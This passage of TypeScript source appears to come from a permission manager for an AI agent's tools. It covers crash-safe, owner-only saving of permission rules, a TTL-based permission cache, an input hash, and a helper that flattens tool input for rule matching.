      const data: Record<string, unknown> = { ...this._extraPersistedKeys, mode: this.mode, rules: this.rules };
      if (additionalDirectories.length > 0) data.additionalDirectories = additionalDirectories;
      else delete data.additionalDirectories;
      // Crash-safe, owner-only persist (temp + fsync + atomic rename, mode 0o600):
      // a half-written permissions.json would be silently dropped by loadRules'
      // catch, wiping every "don't ask again" rule, and the file is not left
      // world-readable. Uses the ONE canonical atomic writer (utils/fs-atomic),
      // which also creates `.ami/` 0o700 — no separate mkdir needed.
      atomicWriteFileSync(filePath, JSON.stringify(data, null, 2) + '\n', { mode: OWNER_ONLY_FILE_MODE });
      this.traceMutation(`Persisting ${this.rules.length} rule(s) + mode '${this.mode}' to ${filePath}`);
      return { ok: true };
    } catch (e) {
      return { ok: false, error: e instanceof Error ? e.message : String(e) };
    }
  }

  // -------------------------------------------------------------------------
  // Policy memo (permission cache)
  // -------------------------------------------------------------------------

  private _memo: PolicyMemo | null = null;

  enableMemo(ttlMs?: number): void {
    this._memo = new PolicyMemo(ttlMs);
  }

  disableMemo(): void {
    this._memo = null;
  }

  getMemo(): PolicyMemo | null {
    return this._memo;
  }

  private _hashInput(input: Record<string, unknown>): string {
    const str = JSON.stringify(input);
    let hash = 0;
    for (let i = 0; i < str.length; i++) {
      hash = ((hash << 5) - hash + str.charCodeAt(i)) | 0;
    }
    return hash.toString(36);
  }

  // -------------------------------------------------------------------------
  // Internal helpers
  // -------------------------------------------------------------------------

  /**
   * Convert tool input into a flat string for pattern matching.
   */
  private inputToString(toolName: string, input: Record<string, unknown>): string {
    if (typeof input.command === 'string') return input.command;
    if (typeof input.file_path === 'string') return input.file_path;
    return JSON.stringify(input);
  }
}
